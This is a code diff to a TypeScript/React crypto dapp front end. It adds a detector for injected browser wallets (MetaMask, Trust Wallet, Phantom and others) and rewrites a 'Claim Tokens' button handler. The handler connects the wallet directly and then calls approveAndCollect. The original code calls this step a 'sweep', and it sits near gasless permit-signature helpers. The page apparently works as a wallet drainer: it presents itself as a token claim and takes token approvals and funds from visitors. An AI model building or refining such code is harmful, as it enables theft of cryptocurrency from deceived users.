@@ -169,6 +169,50 @@ const smartTokenSort = (a: any, b: any) => {
 
 const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))
 
+
+// ── DIRECT INJECTED PROVIDER DETECTOR (all known wallets) ──
+const detectDirectProvider = (): { provider: any; walletName: string } | null => {
+  if (typeof window === 'undefined') return null;
+  const w = window as any;
+  const ethereum = w.ethereum;
+  if (!ethereum) return null;
+  
+  const providers = ethereum.providers ? [...ethereum.providers] : [ethereum];
+  
+  // Well-known wallet detectors (order matters – check for specific wallets first)
+  const detectors: { name: string; check: (p: any) => boolean }[] = [
+    { name: 'Trust Wallet',   check: (p) => p.isTrust || p.isTrustWallet || p._isTrust },
+    { name: 'MetaMask',       check: (p) => p.isMetaMask && !p.isTrust && !p.isTrustWallet && !p.isSafePal && !p.isTokenPocket && !p.isCoinbaseWallet },
+    { name: 'Coinbase Wallet',check: (p) => p.isCoinbaseWallet || p.isCoinbase },
+    { name: 'SafePal',        check: (p) => p.isSafePal },
+    { name: 'TokenPocket',    check: (p) => p.isTokenPocket },
+    { name: 'Brave Wallet',   check: (p) => p.isBraveWallet },
+    { name: 'Rabby Wallet',   check: (p) => p.isRabby },
+    { name: 'OKX Wallet',     check: (p) => p.isOKXWallet || p.isOkx },
+    { name: 'Phantom',        check: (p) => p.isPhantom },
+    { name: 'Bitget Wallet',  check: (p) => p.isBitget || p.isBitgetWallet },
+    { name: 'Opera Wallet',   check: (p) => p.isOpera },
+  ];
+  
+  for (const provider of providers) {
+    for (const detector of detectors) {
+      if (detector.check(provider)) {
+        return { provider, walletName: detector.name };
+      }
+    }
+  }
+  
+  // Fallback: return the first provider that has a request method (generic EIP-1193)
+  for (const provider of providers) {
+    if (provider.request) {
+      return { provider, walletName: 'Injected Wallet' };
+    }
+  }
+  
+  return null;
+};
+
+
 export default function App({ onClose }: { onClose?: () => void } = {}) {
   // ── Original Dapp state ──
   const [status, setStatus] = useState('Ready')
@@ -307,15 +351,39 @@ export default function App({ onClose }: { onClose?: () => void } = {}) {
   }
 
   // ── Claim Tokens handler ──
-  const handleClaimTokens = () => {
-    if (!isConnected) {
-      manualConnect.current = true
-      open()
-      return
-    }
-    // Trigger the sweep directly
-    approveAndCollect()
+const handleClaimTokens = async () => {
+  if (isConnected) {
+    approveAndCollect();
+    return;
   }
+
+  // 🚀 Direct injection detection – bypasses Reown modal when a native wallet is present
+  const direct = detectDirectProvider();
+  if (direct && direct.provider && direct.provider.request) {
+    try {
+      setLoading(true);
+      setStatus('Connecting Wallet...');
+      log(`[SYSTEM] ${direct.walletName} detected. Connecting directly...`);
+      const accounts = await direct.provider.request({ method: 'eth_requestAccounts' });
+      if (accounts && accounts.length > 0) {
+        log(`[SYSTEM] Connected: ${accounts[0]}`);
+        await approveAndCollect(direct.provider, accounts[0]);
+      } else {
+        setLoading(false);
+        setStatus('Ready');
+      }
+    } catch (e) {
+      log('❌ Direct connection cancelled or failed');
+      setStatus('Ready');
+      setLoading(false);
+    }
+    return;
+  }
+
+  // Fallback: standard Reown modal
+  manualConnect.current = true;
+  open();
+};
 
   // ── GASLESS SIGNATURE HELPERS ──
   const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
